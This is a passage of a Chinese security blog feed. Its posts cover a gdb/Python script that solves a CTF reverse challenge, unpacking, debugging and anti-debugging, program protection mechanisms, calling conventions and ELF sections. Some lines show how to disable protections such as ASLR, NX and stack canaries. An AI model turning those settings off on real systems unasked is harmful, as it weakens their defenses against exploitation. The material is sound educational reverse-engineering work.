        <content type="html"><![CDATA[<h1 id="举例说明gdb脚本以及Python脚本的使用。"><a href="#举例说明gdb脚本以及Python脚本的使用。" class="headerlink" title="举例说明gdb脚本以及Python脚本的使用。"></a>举例说明gdb脚本以及Python脚本的使用。</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>以攻防世界reverse中的hackme题目为例，题目思路比较简单。就是异或计算。  </p><div align=center><img src="./IDA反编译.png" alt="IDA反编译" width="50%" height="50%"  /></div>但是题目中有点陷阱，程序中只对字符串进行了10次比较，达不到其需要的字符串长度，需要更改循环次数以完成对输入的完整检查。  题中每次比较的位置是不定的，而且存在重复比较，若手动处理比较麻烦。<h2 id="gdb脚本"><a href="#gdb脚本" class="headerlink" title="gdb脚本"></a>gdb脚本</h2><p>预设了三个断点  </p><pre><code class="bash">def pos&gt; run&gt; set $i=100&gt; while($i)  &gt; set $tmp=$rax  &gt; c  &gt; set $target= $al;  &gt; c  &gt; set $tartget= $target ^ $dl;  &gt; printf &quot;pos:%d,target:%d &quot;,$tmp,$target  &gt; set $i--  &gt; c  &gt;end&gt;endpos</code></pre><h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><p>预设了三个断点  </p><pre><code class="python">import gdb#用户自定义命令需要继承gdb.Command类class Pos(gdb.Command):    def __init__(self):        super(self.__class__,self).__init__(&quot;pos&quot;,gdb.COMMAND_USER)  #注册改命令的名字    def invoke(self,args,from_tty):        ss=list(&quot;01234567890123456789012&quot;)  #生成一个随便的内容的列表        gdb.execute(&quot;run&quot;)        i=100        while i:            pos=gdb.parse_and_eval(&quot;$eax&quot;) # 获取寄存器的值            gdb.execute(&quot;c&quot;)            target=gdb.parse_and_eval(&quot;$al&quot;)            gdb.execute(&quot;c&quot;)            target=target ^ gdb.parse_and_eval(&quot;$dl&quot;)            gdb.execute(&quot;c&quot;)            ss[pos]=chr(target)            i-=1        print(&quot;flag: &quot;+&quot;&quot;.join(ss))Pos()  #注册该命令</code></pre><p>两秒出结果，舒服。</p><div align=center><img src="./flag.png" alt="flag" width="50%" height="50%"  /></div>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> GDB </tag>
            
            <tag> Python </tag>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下的加壳脱壳</title>
      <link href="/2020/03/13/%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3/"/>
      <url>/2020/03/13/%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h1><p>IAT(Input Address Table),输入地址表。通俗的讲，IAT中存放了程序执行所用到的外部API的地址。与之对应的显然就还有输出地址表，存放着文件给外部使用的API的地址。现阶段的加壳脱壳中，更多的关注的是IAT。</p><h1 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h1><p>一段专门负责保护软件不被非法修改或反编译的程序，一般先于程序运行。</p><h2 id="壳的分类"><a href="#壳的分类" class="headerlink" title="壳的分类"></a>壳的分类</h2><h3 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h3><p>压缩壳的主要目的是缩减软件大小，例如<code>upx</code>、<code>ASPack</code>等等，脱起来也比较简单，可利用现有的脚本脱，也可手动脱</p><h3 id="加密壳"><a href="#加密壳" class="headerlink" title="加密壳"></a>加密壳</h3><p>加密壳侧重于保护软件，例如加密核心算法，或者限制软件使用等等。</p><ol><li>常见的<code>ASprotect</code>通过强有力的加密算法，来加密程序，官方提供相关的SDK，倡导开发者尽量使用SDK来开发。</li><li><code>Armadillo穿山甲</code>将程序中的所有跳转指令替换为int3指令，当子进程遇到int3异常时，父进程截获异常并计算出跳转的目标地址，然后返回给子进程继续运行。</li></ol><h3 id="虚拟机保护"><a href="#虚拟机保护" class="headerlink" title="虚拟机保护"></a>虚拟机保护</h3><p>这个就最厉害了，虚拟机拥有一套自定义的指令系统，首先将已知的指令集替换为自己的指令集，然后在运行时，自定义的指令集将在虚拟的cpu中运行。</p><h2 id="壳的加载过程"><a href="#壳的加载过程" class="headerlink" title="壳的加载过程"></a>壳的加载过程</h2><h3 id="1-保存入口参数"><a href="#1-保存入口参数" class="headerlink" title="1. 保存入口参数"></a>1. 保存入口参数</h3><p>加壳程序在初始化之前会保存当前的运行环境，以便外壳执行完毕之后方便程序继续执行。</p><h3 id="2-获取外壳所需的API地址"><a href="#2-获取外壳所需的API地址" class="headerlink" title="2. 获取外壳所需的API地址"></a>2. 获取外壳所需的API地址</h3><p>一般情况下，外壳的输入表中只有<code>GetProcAddress</code>，<code>GetModuleHandle</code>，<code>LoadLibrary</code>三个函数，甚至只有<code>Kernel32.dll</code>和<code>GetProcAddress</code>，所需要的其他函数将通过现有的函数进行加载、查询使用。</p><h3 id="3-解密原程序各个区块的数据"><a href="#3-解密原程序各个区块的数据" class="headerlink" title="3. 解密原程序各个区块的数据"></a>3. 解密原程序各个区块的数据</h3><p>一般来说各个数据按照区块来进行解密，但是也有程序用到哪就解密哪，增加分析难度。</p><h3 id="4-IAT的初始化"><a href="#4-IAT的初始化" class="headerlink" title="4. IAT的初始化"></a>4. IAT的初始化</h3><p>外壳程序将PE头中的输入表指针指向自建的输入表，该表由PE装载器负责填充，原程序的输入表将由外壳程序来进行维护。</p><h3 id="5-重定位项的处理"><a href="#5-重定位项的处理" class="headerlink" title="5. 重定位项的处理"></a>5. 重定位项的处理</h3><p>外壳程序的重定位主要由系统的提供实现，但原程序的代码就可能需要修复重定位，可以取消原程序的重定位，或者原程序的重定位段交由外壳程序进行修复重定位。</p><h3 id="6-恢复原程序的执行环境"><a href="#6-恢复原程序的执行环境" class="headerlink" title="6. 恢复原程序的执行环境"></a>6. 恢复原程序的执行环境</h3><h3 id="7-跳转到原程序的入口开始执行"><a href="#7-跳转到原程序的入口开始执行" class="headerlink" title="7. 跳转到原程序的入口开始执行"></a>7. 跳转到原程序的入口开始执行</h3><h1 id="脱壳（一般情况）"><a href="#脱壳（一般情况）" class="headerlink" title="脱壳（一般情况）"></a>脱壳（一般情况）</h1><p>一般情况下的脱壳大致步骤如下</p><h2 id="1-寻找OEP"><a href="#1-寻找OEP" class="headerlink" title="1. 寻找OEP"></a>1. 寻找OEP</h2><p>OEP(Original Entry Point),程序入口点。简单的外壳程序跳转到OEP时意味着此时内存中的原程序已经完成了脱壳。那寻找OEP的方法一般如下：</p><ol><li>根据跨段指令。外壳程序的指令可能运行在自定义的段中，完成解密之后，将跳转到.text段开始执行原程序，由此可知跳转之后的地址即为OEP。</li><li>使用内存访问断点。外壳程序在解密过程中，将对原程序的所有内存进行一次访问解密，当再次访问原程序的.text段时，说明此时开始执行原程序代码。</li><li>根据栈平衡原理。原程序在运行之前，外壳程序必须先恢复之前原有的堆栈环境。通过观察明显的<code>pushad/popad</code>、<code>pushfd\pofd</code>等指令，或对ESP设置硬件访问断点，于是可找到OEP</li></ol><h2 id="2-抓取内存映像"><a href="#2-抓取内存映像" class="headerlink" title="2. 抓取内存映像"></a>2. 抓取内存映像</h2><p>完成了OEP的寻找之后，执行到OEP时，原程序已经完成了解密，通过抓取内存壳得到原程序。<br>这一操作更多的依赖于<code>LordPE</code>,<code>PETools</code>等工具，主要通过<code>Module32Next</code>函数获取进程的有关信息，然后选取数据保存。保存的数据其实包含了外壳程序。这些工具在保存时一般默认重建了PE头，修改了OEP。<br>当然有一些anti-dump操作，比如修改系统中<code>modBaseSize</code>的值，或是修改内存属性不让读取等等，可以通过手动纠正映像大小，修改内存属性等绕过。</p><h2 id="3-重建IAT"><a href="#3-重建IAT" class="headerlink" title="3. 重建IAT"></a>3. 重建IAT</h2><p>上述操作完成之后得到了新的PE文件，但是并不能执行，因为程序中所有使用的API的地址都未知，也就是说IAT表没有修复，程序无法使用API。<br>这一过程也是使用工具完成，如<code>ImportREC</code>。IAT是一般一块连续的数据，以00作为结尾，当遇到多块IAT时，工具只能检测到一块，其余可能需要手动调整IAT地址和大小获取各个IAT数据。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.pediy.com/thread-20366.htm" target="_blank" rel="noopener">脱壳入门初级教学</a><br>《加密与解密 第四版》</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>调试与反调试</title>
      <link href="/2020/03/13/%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
      <url>/2020/03/13/%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>说到调试，最明显的工作就是将程序拖入、附加到调试器中，但是中间存在什么样的原理呢  </p><h2 id="创建附加被调试进程"><a href="#创建附加被调试进程" class="headerlink" title="创建附加被调试进程"></a>创建附加被调试进程</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>由<code>DbgUiConnectToDbg</code>函数调用<code>ZwCreateDebugObject</code>创建一个调试对象，并将调试对象句柄保存在调试器当前线程的TEB结构的DbgSsReserved[1]中。然后在<code>CreateProcess</code>创建进程时添加标志DEBUG_PROCESS即可完成创建被调试对象，也可以使用<code>DebugActiveProcess</code>附加到一个现有的进程上。  </p><pre><code class="C++">BOOL WaitForDebugEvent(  LPDEBUG_EVENT lpDebugEvent,   //指向DEBUG_EVENT结构的指针，该 结构接收有关调试事件的信息。  DWORD         dwMilliseconds  //等待调试事件的毫秒数。如果此参数为零，则该函数将测试调试事件并立即返回。如果参数为INFINITE，则在发生调试事件之前该函数不会返回。);</code></pre><p><code>WaitForDebugEvent</code>用于等待和接收调试事件,处理调试事件后，调试器调用<code>ContinueDebugEvent</code>将处理结果回复给调试子系统。</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux下的调试工具gdb主要依赖<code>ptrace</code>，<code>ptrace</code>可以让父进程观察子进程的执行，可以改变子进程的内存和寄存器</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="软件断点"><a href="#软件断点" class="headerlink" title="软件断点"></a>软件断点</h3><p>通过在代码中设置特定值的方式实现的，比如说Windows下断点处的指令将会被变为int3，到达断点处之后，调试器通过对比现有的断点列表得知其为用户断点，于是在程序被中断到调试器之前，将int3代码替换为原来的代码，再将控制权交给用户。当用户期望恢复执行被调试进程时，调试器通过API通知调试子系统，然后系统内核的异常分发函数将返回到异常处理函数，处理函数再通过<code>IRET/IRETD</code>指令发出异常返回工作，恢复CPU的上下文，从中断处继续执行。</p><h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>硬件中断主要通过DR0-DR3调试地址寄存器、DR6调试控制寄存器以及RD7调试状态寄存器实现的。DR0-DR3保存了制定断点的内存或IO地址.当调试发生时，DR6将用来报告调试器更加详细的信息。DR7则用来保存各个硬件断点的中断条件。</p><h2 id="单步执行"><a href="#单步执行" class="headerlink" title="单步执行"></a>单步执行</h2><p>单步执行主要是通过eflags寄存器上的TF位来实现的。当TF为1时，单步中断，执行完一条语句之后将发生异常，进入异常处理函数之后TF为将自动置0.</p><h3 id="单步进入"><a href="#单步进入" class="headerlink" title="单步进入"></a>单步进入</h3><p>在执行指令时，通过调试符号获取当前位置的行信息，再通过TF位单步异常之后对比前后位置行信息即可。</p><h3 id="单步跳过"><a href="#单步跳过" class="headerlink" title="单步跳过"></a>单步跳过</h3><p>执行不包含call的指令时，原理与单步进入是一样的。在执行包含call指令的语句时，则在下一条指令设置断点，然后继续运行，对比前后位置行信息即可。</p><h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><ol><li><code>IsDebuggerPresent</code></li><li><code>CheckRemoteDebuggerPresent</code> </li><li><code>NtQueryInformationProcess</code>在参数中可以要求返回调试端口</li><li><code>ZwSetInformationThread</code>可以要求分离，终止被调试的进程</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li>窗口信息</li><li>注册表</li><li>代码校验和</li><li>硬件断点</li><li>时钟检测</li><li>……</li></ol><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><ol><li><a href="https://b0ldfrev.gitbook.io/note/windows_operating_system/tiao-shi-yuan-li" target="_blank" rel="noopener">调试原理</a></li><li><a href="https://bbs.pediy.com/thread-225740.htm" target="_blank" rel="noopener">反调试技术总结</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> AntiDebug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows、Linux程序常见的保护机制</title>
      <link href="/2020/03/04/Windows%E3%80%81Linux%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2020/03/04/Windows%E3%80%81Linux%E7%A8%8B%E5%BA%8F%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>简单介绍一些Windows、Linux下的程序常见的保护机制对应的编译选项</p><h1 id="windows平台"><a href="#windows平台" class="headerlink" title="windows平台"></a>windows平台</h1><h2 id="GS与变量重排技术"><a href="#GS与变量重排技术" class="headerlink" title="GS与变量重排技术"></a>GS与变量重排技术</h2><h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>主要用于防止栈溢出。调用函数时，在压入EBP之前，也就是紧邻EBP的低地址中将存放一个Security Cookie，即一个随机数。该随机数由.data字节的第一个QWORD作为种子生成。在函数返回之前，对Cookie进行检查，如果不对，则表明存在溢出，将发起异常，由对应的异常处理函数来进行处理，然后退出。<br>编译选项为：vs中项目/**属性/配置属性/c++/代码生成/缓冲区安全检查  </p><h3 id="变量重排技术"><a href="#变量重排技术" class="headerlink" title="变量重排技术"></a>变量重排技术</h3><p>在编译时，根据局部变量的类型对变量在栈中的位置进行调整，将字符变量移动到高地址等等措施方式局部变量被溢出修改</p><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><p>在程序调用异常处理函数之前，对要调用的函数进行一系列的有效性校验，当函数发现不可靠时将终止异常处理函数的调用，以防止SEH(Struct Exception Handler)的恶意利用。该功能需要操作系统与编译器的支持。<br>大致流程：  </p><ol><li>检查异常处理链是否在当前栈中</li><li>检查异常处理函数指针是否指向当前栈中</li><li>调用<code>RtlIsValidHandler()</code>函数进行相关检测</li></ol><div align=center><img src="./RtlIsVaildHandler校验流程.jpg" alt="RtlIsValidHandler校验流程" width="70%" height="70%"  /></div><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><p>DEP(Data Execution Prevention)，数据执行保护，将数据页标记为不可执行，当去数据页执行时，引发异常。<br>系统提供<code>VirtualProtect</code>等等函数来让程序手动修改页属性<br>编译选项：vs中项目/**属性/配置属性/链接器/高级/数据执行保护  </p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>ASLR(Address Space Layout Randomization),内存随机化保护机制。在PE头中<code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code>标志是否支持ASLR。<br>编译选项：vs中项目/**属性/配置属性/链接器/高级/随机基址<br>注册表中键值<code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages</code>将影响系统ASLR支持：  </p><ol><li>0映像随机化将禁用</li><li>-1强制进行处理</li><li>其他正常工作，依赖标识选择处理</li></ol><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p>SEHOP(Structured Exception Handling Overwrite Protection),它将检查SEH链的完整性，其会检查SEH链的末端是否为系统固定的终极异常处理函数。<br>注册表中的键值<code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel\DisableExceptionChainValidation</code>将影响系统SHEOP支持  </p><h1 id="Linux平台"><a href="#Linux平台" class="headerlink" title="Linux平台"></a>Linux平台</h1><h2 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h2><p>与Windows下的GS类似，通过验证canary的值来判断栈是否溢出。<br>gcc编译选项： </p><ol><li>默认不开启canary保护</li><li><code>-fstack-protector-all</code>为所有函数提供保护</li><li><code>-fstack-protector</code>为使用alloca或本地缓冲区大于8的函数提供保护</li><li><code>--param ssp-buffer-size=4</code>设定不提供保护的函数缓冲区下限</li><li><code>-fno-stack-protector</code>禁用canary保护</li></ol><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>Fortify能够轻微的检测对内存和字符串操作的函数的缓冲区溢出问题，目前支持的一些函数有<code>memcpy</code>, <code>mempcpy</code>, <code>memmove</code>, <code>memset</code>, <code>strcpy</code>, <code>stpcpy</code>, <code>strncpy</code>, <code>strcat</code>, <code>strncat</code>, <code>sprintf</code>, <code>vsprintf</code>, <code>snprintf</code>, <code>vsnprintf</code>, <code>gets</code>等等<br>gcc编译选项：</p><ol><li>默认不开启</li><li><code>-D_FORTIFY_SOURCE=1</code>配合优化<code>-O1</code>使用，程序在编译时进行检查但是不改变程序功能</li><li><code>-D_FORTIFY_SOURCE=2</code>，添加新的检查功能，运行时检查，检查异常失败将运行时错误</li></ol><h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>类似Windows下的DEP，Linux下系统提供mprotect等函数来允许程序手动修改页的相关属性。<br>gcc编译选项：</p><ol><li>默认开启NX保护</li><li><code>-z execstack</code>禁用NX保护</li><li><code>-z noexecstack</code>开启NX保护</li></ol><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><h3 id="PIC"><a href="#PIC" class="headerlink" title="PIC"></a>PIC</h3><p>PIC(Position-indenpendent Code),位置无关代码技术。PIC主要解决共享对象指令和可执行文件中对绝对地址的重定位问题</p><h3 id="PIE-1"><a href="#PIE-1" class="headerlink" title="PIE"></a>PIE</h3><p>PIE(Position-indenpendent Executable),类似ASLR，内存地址随机化机制，一个以地址无关方式编译的可执行文件被称作为地址无关可执行文件。<br>系统选项：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>禁用PIE功能  </p><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO( Relocation Read-Only),在动态链接的ELF文件中，往往使用got表来动态解析共享库中的函数，而延时绑定技术将在程序运行过程中根据需要查找定位函数，使得got在整个过程中是可写的，这样可能使得got表覆盖而执行任意代码。而RELRO将使程序在开始执行前，解析所有动态链接的函数，然后将got表设置为只读，如此为完全的RELRO保护。而部分的RELRO保护只保护非PLT部分（即.got只读，但是.got.plt可写）<br>gcc编译选项：</p><ol><li>默认部分开启</li><li><code>-z norelro</code>关闭RELRO防护</li><li><code>-z lazy</code>部分开启</li><li><code>-z now</code>开启全部防护</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">linux程序的常用保护机制</a><br><a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection" target="_blank" rel="noopener">Buffer overflow protection</a><br><a href="https://lwn.net/Articles/584225/" target="_blank" rel="noopener">“Strong” stack protection for GCC</a><br><a href="https://access.redhat.com/blogs/766093/posts/1976213" target="_blank" rel="noopener">Enhance application security with FORTIFY_SOURCE</a><br><a href="http://man7.org/linux/man-pages/man2/mprotect.2.html" target="_blank" rel="noopener">mprotect(2) - Linux manual page - man7.org</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect" target="_blank" rel="noopener">VirtualProtect function</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SecurityTechnologies </tag>
            
            <tag> OS </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈相关</title>
      <link href="/2020/03/03/%E6%A0%88%E7%9B%B8%E5%85%B3/"/>
      <url>/2020/03/03/%E6%A0%88%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="栈-1"><a href="#栈-1" class="headerlink" title="栈"></a>栈</h2><p>限定仅在表尾进行插入和删除操作的线性表，栈常用的操作有压栈与弹栈，用于标识栈的属性有栈顶与栈底。<br>ESP寄存器保存着永远指向系统栈最上面一个栈帧的栈顶。<br>EBP寄存器保存着永远指向系统栈最上面一个栈帧的栈底。  </p><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>提到栈，想到的就是函数的调用</p><h3 id="jump与call的区别"><a href="#jump与call的区别" class="headerlink" title="jump与call的区别"></a>jump与call的区别</h3><p>jump是跳转到该地址开始执行。而执行完成之后的返回地址将由程序自行确定。<br>call是把下一条指令的地址压入栈之后再跳转执行，方便ret到正确的下一条指令，中间涉及到堆栈平衡的操作。</p><h3 id="C-中函数调用约定"><a href="#C-中函数调用约定" class="headerlink" title="C++中函数调用约定"></a>C++中函数调用约定</h3><ol><li>__cdecl c++的默认约定方式，参数的入栈顺序是从右往左（使用时就是从左往右赋值），栈平衡的操作将在主函数内完成</li><li>__fastcall 也是从右往左，栈平衡在被调函数中完成</li><li>__stdcall 从右往左，被调函数中完成</li></ol><h3 id="cdecl举例"><a href="#cdecl举例" class="headerlink" title="__cdecl举例"></a>__cdecl举例</h3><ol><li>常见的__cdecl为例，主调函数首先将参数从右往左压入栈</li><li>call指令执行，将函数的返回地址，也就是EIP压入栈，把EIP设置为函数的起始地址</li><li>将主调函数的栈帧底压入栈</li><li>将ESP赋值给EBP，设置帧基指针</li><li>有需要的话将寄存器的值再进行保存</li><li>然后抬高栈顶，为变量分配空间</li><li>函数ret之前，恢复之前保存的寄存器值</li><li>将EBP赋值给ESP，并弹栈赋值EBP，以返回主调函数栈帧</li><li>ret返回主调函数继续执行</li></ol><h4 id="举例举例"><a href="#举例举例" class="headerlink" title="举例举例"></a>举例举例</h4><pre><code class="x86asm">   0x08048451 &lt;+0&gt;:    lea    ecx,[esp+0x4]      ；为了保存当前栈顶值   0x08048455 &lt;+4&gt;:    and    esp,0xfffffff0     ；这里不是太明白用处，可能也是为了抬高栈顶   0x08048458 &lt;+7&gt;:    push   DWORD PTR [ecx-0x4]   0x0804845b &lt;+10&gt;:    push   ebp   0x0804845c &lt;+11&gt;:    mov    ebp,esp   0x0804845e &lt;+13&gt;:    push   ecx                ；压栈，保存ecx的值，以便之后恢复堆栈平衡   0x0804845f &lt;+14&gt;:    sub    esp,0x4            ；抬高栈顶，为函数的局部变量分配空间   0x08048462 &lt;+17&gt;:    call   0x804847f &lt;__x86.get_pc_thunk.ax&gt;    ；与PIC技术相关，获取代码位置，用以地址无关代码。函数执行的结果是返回EIP的值   0x08048467 &lt;+22&gt;:    add    eax,0x1b99   0x0804846c &lt;+27&gt;:    call   0x8048426 &lt;print()&gt;   0x08048471 &lt;+32&gt;:    mov    eax,0x0   0x08048476 &lt;+37&gt;:    add    esp,0x4            ；栈空间释放   0x08048479 &lt;+40&gt;:    pop    ecx                ；弹出保存的寄存器的值   0x0804847a &lt;+41&gt;:    pop    ebp                    0x0804847b &lt;+42&gt;:    lea    esp,[ecx-0x4]      ；恢复完主调函数的帧基指针   0x0804847e &lt;+45&gt;:    ret </code></pre><h3 id="有关栈平衡"><a href="#有关栈平衡" class="headerlink" title="有关栈平衡"></a>有关栈平衡</h3><p>栈平衡不仅仅是返回之后EBP更改为主调函数的栈基指针，而且要求栈帧中不在包含调用函数时压入的参数，如此才为平衡。</p><pre><code class="c++">int  __attribute__((stdcall))  print(int a,int b,int c){    return a+b+c;}int  __attribute__((cdecl))  print(int a,int b,int c){    return a+b+c;}</code></pre><p>__stdcall约定方式</p><pre><code class="x86asm">   0x08048426 &lt;+0&gt;:    push   ebp   0x08048427 &lt;+1&gt;:    mov    ebp,esp   0x08048429 &lt;+3&gt;:    call   0x8048493 &lt;__x86.get_pc_thunk.ax&gt;   0x0804842e &lt;+8&gt;:    add    eax,0x1bd2   0x08048433 &lt;+13&gt;:    mov    edx,DWORD PTR [ebp+0x8]   0x08048436 &lt;+16&gt;:    mov    eax,DWORD PTR [ebp+0xc]   0x08048439 &lt;+19&gt;:    add    edx,eax   0x0804843b &lt;+21&gt;:    mov    eax,DWORD PTR [ebp+0x10]   0x0804843e &lt;+24&gt;:    add    eax,edx   0x08048440 &lt;+26&gt;:    pop    ebp   0x08048441 &lt;+27&gt;:    ret    0xc</code></pre><p>__cdecl约定方式</p><pre><code class="x86asm">   0x08048426 &lt;+0&gt;:    push   ebp   0x08048427 &lt;+1&gt;:    mov    ebp,esp   0x08048429 &lt;+3&gt;:    call   0x8048494 &lt;__x86.get_pc_thunk.ax&gt;   0x0804842e &lt;+8&gt;:    add    eax,0x1bd2   0x08048433 &lt;+13&gt;:mov    edx,DWORD PTR [ebp+0x8]   0x08048436 &lt;+16&gt;:mov    eax,DWORD PTR [ebp+0xc]   0x08048439 &lt;+19&gt;:add    edx,eax   0x0804843b &lt;+21&gt;:mov    eax,DWORD PTR [ebp+0x10]   0x0804843e &lt;+24&gt;:add    eax,edx   0x08048440 &lt;+26&gt;:pop    ebp   0x08048441 &lt;+27&gt;:ret    ；…… →  0x804847b &lt;main+40&gt;:    add    esp, 0xc</code></pre><h3 id="formit-frame-pointer参数"><a href="#formit-frame-pointer参数" class="headerlink" title="-formit-frame-pointer参数"></a>-formit-frame-pointer参数</h3><p>调试程序时发现，printf函数在执行中并没有改变EBP的值，比如说，在main函数调用了printf之后，EBP并没有改变，但是仍然存在着抬高栈顶的操作。《程序员的自我修养》中提到，gcc编译器有参数<code>-formit-frame-pointer</code>，可以取消帧指针，直接通过esp来计算相关变量的位置，这样多了一个ebp寄存器使用。经过编程尝试确实如此，通过<code>-formit-frame-pointer</code>编译后的函数汇编代码中不存在类似 <code>mov esp，ebp</code> 的操作。</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Stack </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见逻辑段</title>
      <link href="/2020/03/01/%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%AE%B5/"/>
      <url>/2020/03/01/%E5%B8%B8%E8%A7%81%E9%80%BB%E8%BE%91%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="text-code"><a href="#text-code" class="headerlink" title=".text .code"></a>.text .code</h2><p>代码段，程序编译后的机器指令往往被放在了代码段。</p><h2 id="data"><a href="#data" class="headerlink" title=".data"></a>.data</h2><p>数据段，初始化了的全局变量和局部静态变量往往放在数据段。</p><h3 id="为啥需要将代码与数据分开？"><a href="#为啥需要将代码与数据分开？" class="headerlink" title="为啥需要将代码与数据分开？"></a>为啥需要将代码与数据分开？</h3><ol><li>指令区域对进程来说是只读的，数据区域需要读写，可以分别设置两者的权限，防止指令被修改</li><li>现代CPU中L1 cache一般设计指令缓存与数据缓存，如此分开，可以提高cache的命中率</li><li>当程序中运行多个该指令集的副本时，物理内存中只需保存一份指令集，再将其映射到不同进程的虚存即可，即共享指令</li></ol><h2 id="bss"><a href="#bss" class="headerlink" title=".bss"></a>.bss</h2><p>未初始化的全局变量和局部静态变量一般放在bss段里。由于数据都未进行初始化，所以没有必要在文件中为其保留空间，.bss段只是为未初始化的全局变量和局部静态变量预留位置，它记录来所有未初始化的全局变量和局部静态变量的大小总和，在文件中不占用空间。</p><h2 id="rodata"><a href="#rodata" class="headerlink" title=".rodata"></a>.rodata</h2><p>只读数据段，还可以在语义上支持C++ 的const关键字。</p><h2 id="comment"><a href="#comment" class="headerlink" title=".comment"></a>.comment</h2><p>存放编译器版本信息。</p><h2 id="rel-text，-rel-data"><a href="#rel-text，-rel-data" class="headerlink" title=".rel.text，.rel.data"></a>.rel.text，.rel.data</h2><p>针对.text、.data段的重定位表。</p><h2 id="got与-plt"><a href="#got与-plt" class="headerlink" title=".got与.plt"></a>.got与.plt</h2><p>got表为了解决在动态链接的时候模块中有绝对地址引用的问题，采用了PIC地址无关代码技术，而这个技术的中心思想就是got表。模块内部的函数调用跳转、数据的访问都可以通过相对地址进行，模块外部的访问函数、数据时就用到了got表。got表中包含了每个变量所在的地址，该地址由链接程序进行维护。通过got表实现了模块外部数据的间接访问。</p><p>plt延时绑定技术，当函数第一次被用到时才进行符号查找，重定位。</p><pre><code class="x86asm">haha@plt:jmp *(haha@got)push 